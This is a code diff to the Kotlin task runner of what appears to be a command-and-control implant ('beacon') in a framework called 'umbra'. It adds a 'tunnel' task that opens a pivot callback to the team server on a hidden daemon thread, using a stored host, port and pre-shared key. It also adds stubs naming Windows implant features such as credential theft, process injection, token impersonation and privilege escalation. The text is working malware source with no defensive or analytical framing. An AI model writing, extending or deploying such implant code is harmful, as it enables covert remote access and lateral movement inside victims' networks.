@@ -11,6 +11,33 @@ import java.util.concurrent.TimeUnit
 object TaskRunner {
     const val MAX_OUTPUT = 900 * 1024
 
+    /**
+     * The connection parameters a task may need.
+     *
+     * Most tasks do not need them, but the pivot callback cannot work
+     * without the address of the team server and the agent key, so the
+     * beacon hands them over once at start-up.
+     */
+    data class Context(
+        val host: String,
+        val port: Int,
+        val psk: ByteArray,
+        val agentId: String,
+        val version: String,
+        val log: (String) -> Unit,
+    ) {
+        override fun equals(other: Any?): Boolean = this === other
+        override fun hashCode(): Int = System.identityHashCode(this)
+    }
+
+    @Volatile
+    private var context: Context? = null
+
+    /** Hand the connection parameters to the task runner. */
+    fun configure(ctx: Context) {
+        context = ctx
+    }
+
     class Outcome(val code: Long, val out: ByteArray, val err: String) {
         /**
          * Extra RESULT fields (`total`, `offset`, `eof`, `sha256`, ...). The
@@ -120,9 +147,53 @@ object TaskRunner {
             "sleep" -> Outcome(0, "sleep interval updated\n".toByteArray(), "")
             "exit", "kill" -> Outcome(0, "beacon exiting\n".toByteArray(), "")
             "ping" -> Outcome(0, "pong\n".toByteArray(), "")
+
+            // ---- pivoting ------------------------------------------------
+            "tunnel" -> tunnel(args)
+
+            // ---- platform specific ---------------------------------------
+            "p2p" -> unsupported("p2p", "peer links need the desktop implant")
+            "bof" -> unsupported("bof", "COFF modules are a Windows capability")
+            "ext" -> unsupported("ext", "extensions are a Windows capability")
+            "inject" -> unsupported("inject", "injection is a Windows capability")
+            "creds" -> unsupported("creds", "the credential vault is a Windows capability")
+            "token" -> unsupported("token", "token impersonation is a Windows capability")
+            "privesc" -> unsupported("privesc", "privilege escalation is a Windows capability")
+            "vpn" -> unsupported("vpn", "the layer-3 tunnel needs a tun device")
+
             else -> Outcome(2, ByteArray(0), "unknown task kind \"$kind\"")
         }
     }
+
+    /**
+     * Open a pivot callback session.
+     *
+     * The session runs on its own thread: the beacon has to keep beaconing
+     * while the pivot is open, so the task only reports that it started.
+     */
+    private fun tunnel(args: Upk): Outcome {
+        val ctx = context
+        if (ctx == null) return Outcome(1, ByteArray(0), "tunnel: the implant has no server address")
+        val streamId = args.field("stream")?.text() ?: ""
+        if (streamId.isEmpty()) return Outcome(1, ByteArray(0), "tunnel requires args.stream")
+        val t = Thread({
+            try {
+                Tunnel.openCallback(
+                    ctx.host, ctx.port, ctx.psk, ctx.agentId, streamId, ctx.version, ctx.log,
+                )
+            } catch (e: Throwable) {
+                ctx.log("tunnel callback failed: ${e.message}")
+            }
+        }, "umbra-tunnel-callback")
+        t.isDaemon = true
+        t.start()
+        return Outcome(0, "tunnel session $streamId opened\n".toByteArray(), "")
+            .with("stream", Upk.str(streamId))
+    }
+
+    /** Report a capability this platform does not have. */
+    private fun unsupported(kind: String, why: String): Outcome =
+        Outcome(2, ByteArray(0), "unsupported on this platform: $kind ($why)")
 
     /**
      * Read one chunk of a file, mirroring implant/rust/src/task.rs.
